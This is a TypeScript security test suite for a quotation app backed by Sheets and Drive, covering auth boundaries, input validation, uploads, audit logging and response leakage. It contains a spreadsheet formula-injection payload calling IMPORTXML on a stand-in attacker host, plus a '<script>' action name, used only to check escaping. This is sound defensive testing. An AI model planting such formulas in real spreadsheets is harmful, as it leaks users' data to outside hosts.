/**
 * The cross-cutting security suite.
 *
 * Everything here is a property of the SYSTEM rather than of one module, and
 * each test is written so that adding a new action or a new write site without
 * the corresponding control makes it fail. That is the point: the controls in
 * PRD §33 and IMPLEMENTATION_PLAN.md §19 are only real if a regression breaks
 * a build.
 *
 * Every test runs against the in-memory fakes. Nothing touches a real Drive, a
 * real spreadsheet, or a real deployment.
 */

import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

import { TEST_ONLY_documentBase64 } from '../__fixtures__/document-fixtures';
import { installGasFakes, type GasEnvironment } from '../__fixtures__/gas-fakes';
import { TEST_ONLY_buildPng, TEST_ONLY_toBase64 } from '../__fixtures__/png-fixtures';
import { AUDIT_SHEET_NAME } from '../audit/audit-log';
import { createPasswordRecord } from '../auth/password';
import { ACTIONS, handlePost } from '../main';
import { QUOTATIONS_SHEET_NAME } from '../sheets/quotations-sheet';
import { SENSITIVE_SHEETS } from '../sheets/sheet-access';
import { TEST_ONLY_resetBootstrapState } from '../sheets/sheet-bootstrap';
import { createPerson, setSignatureFileId } from '../sheets/persons-sheet';
import { createUser } from '../sheets/users-repository';
import { AUDITED_ACTIONS, READ_ONLY_ACTIONS, isSafeAuditValue } from './audit';
import { FORBIDDEN_KEYS } from './sanitize';

/** The `Users` sheet's column order, as `users-repository` writes it. */
const USER_COLUMN = { role: 4, active: 5 } as const;

const PEPPER = 'test-only-pepper-not-a-real-key';
const PASSWORD = 'TEST_ONLY_correct-horse-battery';
const ADMIN_PASSWORD = 'TEST_ONLY_admin-horse-battery';

interface Envelope {
  ok: boolean;
  data?: unknown;
  error?: { code: string; message: string; fields?: Record<string, string> };
}

let env: GasEnvironment;
let userToken: string;
let adminToken: string;
let signatoryId: string;

function postRaw(body: string): Envelope {
  const output = handlePost(body) as unknown as { getContent: () => string };
  return JSON.parse(output.getContent()) as Envelope;
}

function call(action: string, payload: unknown = {}, token?: string): Envelope {
  return postRaw(
    JSON.stringify({
      action,
      requestId: 'test-request',
      payload,
      ...(token === undefined ? {} : { token }),
    }),
  );
}

function auditRows(): unknown[][] {
  return env.spreadsheet.dataRows(AUDIT_SHEET_NAME);
}

function seedUsers(): void {
  const staff = createPasswordRecord(PASSWORD, PEPPER, 1_000);
  createUser({
    email: 'staff@speedxksa.com',
    passwordHash: staff.hash,
    salt: staff.salt,
    iterations: staff.iterations,
    role: 'User',
  });

  const admin = createPasswordRecord(ADMIN_PASSWORD, PEPPER, 1_000);
  createUser({
    email: 'admin@speedxksa.com',
    passwordHash: admin.hash,
    salt: admin.salt,
    iterations: admin.iterations,
    role: 'Admin',
  });

  userToken = (
    call('auth.login', { email: 'staff@speedxksa.com', password: PASSWORD }).data as {
      token: string;
    }
  ).token;

  adminToken = (
    call('auth.login', { email: 'admin@speedxksa.com', password: ADMIN_PASSWORD }).data as {
      token: string;
    }
  ).token;
}

function validQuotation(overrides: Record<string, unknown> = {}): Record<string, unknown> {
  return {
    draftId: 'draft-0001',
    quotationDate: '2026-08-11',
    quotationFor: 'TEST_ONLY manpower supply',
    pricingMode: 'amount',
    client: {
      clientName: 'TEST_ONLY Contact',
      companyName: 'TEST_ONLY Client Co.',
      address: 'TEST_ONLY Address, Riyadh',
    },
    lines: [
      {
        category: 'Manpower',
        description: 'TEST_ONLY General Labour',
        quantity: 40_000,
        unit: 'Hour',
        unitPrice: 2_000,
        remarks: '',
      },
    ],
    authorizedPerson: { id: signatoryId },
    ...overrides,
  };
}

beforeEach(() => {
  env = installGasFakes(vi.stubGlobal);
  TEST_ONLY_resetBootstrapState();

  const person = createPerson({
    id: 'TEST_ONLY-person-1',
    name: 'TEST_ONLY_Signatory',
    designation: 'TEST_ONLY Designation',
    companyName: 'TEST_ONLY Company',
    country: 'TEST_ONLY Country',
    email: 'test-only.signatory@example.invalid',
    phone: '+966 50 000 0000',
  });
  setSignatureFileId(person, 'TEST_ONLY-signature-file');
  signatoryId = person.id;

  seedUsers();
});

afterEach(() => {
  vi.unstubAllGlobals();
});

/* -------------------------------------------------------------------------- */
/* 1. Authentication and authorization (PRD §33.1, §19.2)                     */
/* -------------------------------------------------------------------------- */

describe('every action is behind the boundary', () => {
  it('declares only health and auth.login as public', () => {
    const publicActions = Object.keys(ACTIONS).filter(
      (action) => ACTIONS[action]?.access === 'public',
    );

    // Anything else here is an unauthenticated path to Drive or Sheets.
    expect(publicActions.sort()).toEqual(['auth.login', 'health']);
  });

  it('rejects every non-public action with no token', () => {
    for (const action of Object.keys(ACTIONS)) {
      if (ACTIONS[action]?.access === 'public') continue;

      expect(call(action).error?.code, action).toBe('AUTH_REQUIRED');
    }
  });

  it('rejects every non-public action with a forged token', () => {
    // A valid-looking token whose signature was replaced.
    const forged = `${userToken.split('.').slice(0, 2).join('.')}.aaaaaaaaaaaaaaaaaaaaaaaaaaaa`;

    for (const action of Object.keys(ACTIONS)) {
      if (ACTIONS[action]?.access === 'public') continue;

      expect(call(action, {}, forged).error?.code, action).toBe('AUTH_INVALID');
    }
  });

  it('rejects every Admin action for a User token', () => {
    const adminActions = Object.keys(ACTIONS).filter(
      (action) => ACTIONS[action]?.access === 'Admin',
    );

    expect(adminActions.length).toBeGreaterThan(0);
    for (const action of adminActions) {
      expect(call(action, {}, userToken).error?.code, action).toBe('FORBIDDEN');
    }
  });

  it('stops an existing token working the moment the account is deactivated', () => {
    expect(call('auth.me', {}, userToken).ok).toBe(true);

    // The `active` column, set the way an Admin deactivation does.
    const row = env.spreadsheet.sheets.get('Users')?.rows[1] ?? [];
    row[USER_COLUMN.active] = false;

    expect(call('auth.me', {}, userToken).error?.code).toBe('AUTH_INVALID');
  });

  it('takes the role from the sheet, never from the token', () => {
    // Promote in the sheet only: the token still carries `User`.
    const row = env.spreadsheet.sheets.get('Users')?.rows[1] ?? [];
    row[USER_COLUMN.role] = 'Admin';

    expect(call('persons.list', {}, userToken).ok).toBe(true);
    expect(call('admin.createUser', {}, userToken).error?.code).not.toBe('FORBIDDEN');
  });

  it('rejects a revoked token immediately after logout', () => {
    expect(call('auth.logout', {}, userToken).ok).toBe(true);
    expect(call('auth.me', {}, userToken).error?.code).toBe('AUTH_EXPIRED');
  });
});

/* -------------------------------------------------------------------------- */
/* 2. Input validation (PRD §33.6–§33.11, §19.3)                              */
/* -------------------------------------------------------------------------- */

describe('malformed input never reaches a handler', () => {
  const HOSTILE_PAYLOADS: ReadonlyArray<[string, unknown]> = [
    ['a string', 'not an object'],
    ['a number', 42],
    ['an array', [1, 2, 3]],
    ['null', null],
    ['a huge string', { draftId: 'x'.repeat(200_000) }],
    ['unexpected types', { draftId: { nested: true }, quotation: 7 }],
  ];

  it('answers every action with a typed error, never an exception', () => {
    for (const action of Object.keys(ACTIONS)) {
      const token = ACTIONS[action]?.access === 'Admin' ? adminToken : userToken;

      for (const [label, payload] of HOSTILE_PAYLOADS) {
        const response = call(action, payload, token);

        // Whatever happens, the envelope is well-formed and the code is known.
        expect(typeof response.ok, `${action} / ${label}`).toBe('boolean');
        if (!response.ok) {
          expect(response.error?.code, `${action} / ${label}`).not.toBe(undefined);
          expect(response.error?.code, `${action} / ${label}`).not.toBe('INTERNAL_ERROR');
        }
      }
    }
  });

  it('refuses a prototype-pollution key on every action', () => {
    for (const action of Object.keys(ACTIONS)) {
      const token = ACTIONS[action]?.access === 'Admin' ? adminToken : userToken;

      for (const key of FORBIDDEN_KEYS) {
        const body = `{"action":${JSON.stringify(action)},"requestId":"test-request","token":${JSON.stringify(token)},"payload":{${JSON.stringify(key)}:{"polluted":true}}}`;

        expect(postRaw(body).error?.code, `${action} / ${key}`).toBe('VALIDATION_FAILED');
      }
    }

    expect(({} as Record<string, unknown>)['polluted']).toBeUndefined();
  });

  it('recomputes the totals and rejects a tampered one', () => {
    const response = call(
      'quotation.save',
      {
        quotation: validQuotation({
          totals: { subtotal: 1, vatAmount: 1, grandTotal: 1, discountAmount: 0 },
        }),
        finalize: true,
      },
      userToken,
    );

    // Either the totals are recomputed and the claim ignored, or the mismatch
    // is refused outright. What must never happen is the claim being stored.
    if (response.ok) {
      const stored = call('quotation.get', { draftId: 'draft-0001' }, userToken).data as {
        quotation: { totals?: { grandTotal?: number } };
      };
      expect(stored.quotation.totals?.grandTotal).not.toBe(1);
    } else {
      expect(response.error?.code).toBe('TOTALS_MISMATCH');
    }
  });

  it('ignores a client-supplied quotation number on create', () => {
    call(
      'quotation.save',
      {
        quotation: validQuotation({ quotationNumber: 'SFC/RUH/QTN/2099/999' }),
        finalize: true,
      },
      userToken,
    );

    const stored = call('quotation.get', { draftId: 'draft-0001' }, userToken).data as {
      quotation: { quotationNumber?: string };
    };
    expect(stored.quotation.quotationNumber).not.toBe('SFC/RUH/QTN/2099/999');
  });

  it('refuses to change a number that has already been issued', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);

    const response = call(
      'quotation.save',
      {
        quotation: validQuotation({ quotationNumber: 'SFC/RUH/QTN/2099/999' }),
        finalize: true,
      },
      userToken,
    );

    expect(response.error?.code).toBe('QUOTATION_NUMBER_IMMUTABLE');
  });

  it('caps oversized strings rather than storing them', () => {
    const response = call(
      'quotation.save',
      {
        quotation: validQuotation({ quotationFor: 'x'.repeat(5_000) }),
        finalize: false,
      },
      userToken,
    );

    expect(response.error?.code).toBe('VALIDATION_FAILED');
  });
});

/* -------------------------------------------------------------------------- */
/* 3. Injection at every write site (PRD §33, §19.5)                          */
/* -------------------------------------------------------------------------- */

describe('formula injection', () => {
  const ATTACK = '=IMPORTXML("https://attacker.example/log","//x")';

  /** Every cell of every sheet, as written. */
  function allCells(): string[] {
    const cells: string[] = [];
    for (const sheet of env.spreadsheet.sheets.values()) {
      for (const row of sheet.rows) {
        for (const value of row) {
          if (typeof value === 'string') cells.push(value);
        }
      }
    }
    return cells;
  }

  /**
   * The invariant, stated as strongly as it can be: NO cell in the spreadsheet
   * begins with a formula-leading character.
   *
   * Stronger than "the attack string is escaped", and it catches a value that
   * became a formula some other way — a term body starting with `-`, a client
   * name starting with `+`. The one deliberate exception is asserted separately.
   */
  function assertNoLiveFormulas(): void {
    for (const cell of allCells()) {
      const first = cell.charAt(0);
      if (first === '=' && cell.indexOf('=HYPERLINK("https://drive.google.com/') === 0) continue;

      expect(['=', '+', '-', '@'].indexOf(first), cell.slice(0, 60)).toBe(-1);
    }
  }

  it('escapes an attack in every text field a quotation carries', () => {
    call(
      'quotation.save',
      {
        quotation: validQuotation({
          quotationFor: ATTACK,
          client: { clientName: ATTACK, companyName: ATTACK, address: ATTACK },
          lines: [
            {
              category: 'Manpower',
              description: ATTACK,
              quantity: 1_000,
              unit: 'Hour',
              unitPrice: 100,
              remarks: ATTACK,
            },
          ],
        }),
        finalize: true,
      },
      userToken,
    );

    call(
      'quotation.uploadToDrive',
      {
        draftId: 'draft-0001',
        documents: {
          pdf: TEST_ONLY_documentBase64('pdf'),
          docx: TEST_ONLY_documentBase64('docx'),
        },
      },
      userToken,
    );

    // Not one live formula anywhere in the spreadsheet — the register, the
    // record store and the audit log alike.
    assertNoLiveFormulas();
    expect(allCells().some((cell) => cell.indexOf(`'${ATTACK}`) === 0)).toBe(true);
  });

  it('escapes an attack in a term title and body', () => {
    call('terms.create', { title: ATTACK, bodyTemplate: ATTACK }, userToken);

    assertNoLiveFormulas();
    expect(allCells().some((cell) => cell.indexOf(`'${ATTACK}`) === 0)).toBe(true);
  });

  it('escapes an attack in an authorized person and an item', () => {
    call(
      'persons.create',
      {
        name: ATTACK,
        designation: ATTACK,
        companyName: ATTACK,
        country: ATTACK,
        email: 'test-only@example.invalid',
        phone: '+966 50 000 0000',
      },
      adminToken,
    );
    call('items.create', { category: 'Manpower', name: ATTACK, defaultUnit: 'Hour' }, userToken);

    assertNoLiveFormulas();
    expect(allCells().some((cell) => cell.indexOf(`'${ATTACK}`) === 0)).toBe(true);
  });

  it('leaves the ONE intended formula intact, and only that one', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);
    call(
      'quotation.uploadToDrive',
      {
        draftId: 'draft-0001',
        documents: {
          pdf: TEST_ONLY_documentBase64('pdf'),
          docx: TEST_ONLY_documentBase64('docx'),
        },
      },
      userToken,
    );

    const formulas = allCells().filter((cell) => cell.charAt(0) === '=');

    expect(formulas).toHaveLength(1);
    expect(formulas[0]).toMatch(/^=HYPERLINK\("https:\/\/drive\.google\.com\//);
    assertNoLiveFormulas();
  });
});

/* -------------------------------------------------------------------------- */
/* 4. Uploads (PRD §33.14)                                                    */
/* -------------------------------------------------------------------------- */

describe('uploads', () => {
  it('rejects a JPEG renamed as a PNG signature', () => {
    // The exact case a MIME-type or extension check waves through.
    const jpeg = TEST_ONLY_toBase64([0xff, 0xd8, 0xff, 0xe0, ...new Array<number>(4_000).fill(0x20)]);

    const response = call(
      'persons.uploadSignature',
      { id: signatoryId, signature: jpeg, filename: 'signature.png' },
      adminToken,
    );

    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(env.drive.files()).toHaveLength(0);
  });

  it('rejects a PDF header on a document that claims to be a Word file', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);

    const response = call(
      'quotation.uploadToDrive',
      { draftId: 'draft-0001', documents: { docx: TEST_ONLY_documentBase64('pdf') } },
      userToken,
    );

    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(env.drive.files()).toHaveLength(0);
  });

  it('rejects an oversized signature before decoding it', () => {
    const oversized = TEST_ONLY_toBase64(TEST_ONLY_buildPng({ width: 64, height: 64 })).padEnd(
      3_000_000,
      'A',
    );

    expect(
      call(
        'persons.uploadSignature',
        { id: signatoryId, signature: oversized, filename: 'signature.png' },
        adminToken,
      ).error?.code,
    ).toBe('VALIDATION_FAILED');
  });

  it('never makes anything in Drive public', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);
    call(
      'quotation.uploadToDrive',
      {
        draftId: 'draft-0001',
        documents: {
          pdf: TEST_ONLY_documentBase64('pdf'),
          docx: TEST_ONLY_documentBase64('docx'),
        },
      },
      userToken,
    );
    call(
      'persons.uploadSignature',
      {
        id: signatoryId,
        signature: TEST_ONLY_toBase64(TEST_ONLY_buildPng({ width: 640, height: 120 })),
        filename: 'signature.png',
      },
      adminToken,
    );

    expect(env.drive.sharingCalls()).toEqual([]);
  });
});

/* -------------------------------------------------------------------------- */
/* 5. Audit completeness (§19.9)                                              */
/* -------------------------------------------------------------------------- */

describe('audit', () => {
  it('classifies every action in the router as audited or read-only', () => {
    // A new action that is in neither list fails here — which is the point.
    for (const action of Object.keys(ACTIONS)) {
      const classified =
        AUDITED_ACTIONS.indexOf(action) !== -1 || READ_ONLY_ACTIONS.indexOf(action) !== -1;

      expect(classified, `${action} is not classified in security/audit.ts`).toBe(true);
    }
  });

  it('writes an entry for a state-changing action', () => {
    const before = auditRows().length;
    call('quotation.save', { quotation: validQuotation(), finalize: false }, userToken);

    expect(auditRows().length).toBeGreaterThan(before);
  });

  it('writes nothing for a read', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: false }, userToken);
    const before = auditRows().length;

    call('quotation.list', {}, userToken);
    call('quotation.get', { draftId: 'draft-0001' }, userToken);
    call('items.list', {}, userToken);
    call('terms.list', {}, userToken);
    call('persons.list', {}, userToken);

    expect(auditRows().length).toBe(before);
  });

  it('records who, what, the outcome and the request id', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);

    const entry = auditRows().find((row) => row[2] === 'quotation.finalize');

    expect(entry?.[1]).toBe('staff@speedxksa.com');
    expect(entry?.[4]).toBe('success');
    expect(entry?.[5]).toBe('test-request');
  });

  it('never records a password, a token or a payload', () => {
    call('auth.login', { email: 'staff@speedxksa.com', password: PASSWORD });
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);
    call(
      'quotation.uploadToDrive',
      {
        draftId: 'draft-0001',
        documents: {
          pdf: TEST_ONLY_documentBase64('pdf'),
          docx: TEST_ONLY_documentBase64('docx'),
        },
      },
      userToken,
    );

    for (const row of auditRows()) {
      for (const value of row) {
        if (typeof value !== 'string') continue;
        expect(isSafeAuditValue(value), value.slice(0, 60)).toBe(true);
        expect(value).not.toContain(PASSWORD);
        expect(value).not.toContain(userToken);
      }
    }
  });

  it('records a denied attempt as well as a successful one', () => {
    call('persons.create', { name: 'x' }, userToken);
    call('auth.login', { email: 'staff@speedxksa.com', password: 'wrong-password' });

    const outcomes = auditRows().map((row) => row[4]);
    expect(outcomes).toContain('failure');
  });
});

/* -------------------------------------------------------------------------- */
/* 6. What leaves the server (§19.9)                                          */
/* -------------------------------------------------------------------------- */

describe('responses', () => {
  it('never returns a stack trace or an internal path', () => {
    const responses = [
      call('quotation.get', { draftId: 'no-such-draft' }, userToken),
      call('quotation.uploadToDrive', { draftId: 'no-such-draft' }, userToken),
      call('terms.update', { id: 'no-such-term' }, userToken),
      postRaw('{'),
    ];

    for (const response of responses) {
      const body = JSON.stringify(response);
      expect(body).not.toContain('    at ');
      expect(body).not.toContain('.ts:');
      expect(body).not.toContain('/home/');
    }
  });

  it('never returns a spreadsheet id, a sheet name or a row index', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);
    call(
      'quotation.uploadToDrive',
      {
        draftId: 'draft-0001',
        documents: {
          pdf: TEST_ONLY_documentBase64('pdf'),
          docx: TEST_ONLY_documentBase64('docx'),
        },
      },
      userToken,
    );

    const body = JSON.stringify([
      call('quotation.list', {}, userToken),
      call('quotation.get', { draftId: 'draft-0001' }, userToken),
    ]);

    expect(body).not.toContain('test-only-spreadsheet');
    expect(body).not.toContain('test-only-drive-root');
    expect(body).not.toContain('rowNumber');
    expect(body).not.toContain(QUOTATIONS_SHEET_NAME);
  });

  it('never returns password material', () => {
    const body = JSON.stringify([
      call('auth.login', { email: 'staff@speedxksa.com', password: PASSWORD }),
      call('auth.me', {}, userToken),
      call('persons.list', {}, userToken),
    ]);

    expect(body).not.toContain(PASSWORD);
    expect(body.toLowerCase()).not.toContain('passwordhash');
    expect(body.toLowerCase()).not.toContain('salt');
    // The Drive file id of a signature stays server-side (§11.2).
    expect(body).not.toContain('TEST_ONLY-signature-file');
  });

  it('answers a completely unknown action without echoing it back', () => {
    const response = call('attacker.probe.<script>', {}, userToken);

    expect(response.error?.code).toBe('VALIDATION_FAILED');
    expect(JSON.stringify(response)).not.toContain('attacker.probe');
  });
});

/* -------------------------------------------------------------------------- */
/* 7. Sheets and Drive posture                                                */
/* -------------------------------------------------------------------------- */

describe('storage posture', () => {
  it('hides the sheets that hold credentials and the audit trail', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: false }, userToken);

    for (const name of SENSITIVE_SHEETS) {
      expect(env.spreadsheet.formatting(name)?.hidden, name).toBe(true);
    }
  });

  it('leaves the business sheets visible', () => {
    call('quotation.save', { quotation: validQuotation(), finalize: true }, userToken);

    expect(env.spreadsheet.formatting('QuotationRecords')?.hidden).toBe(false);
  });
});
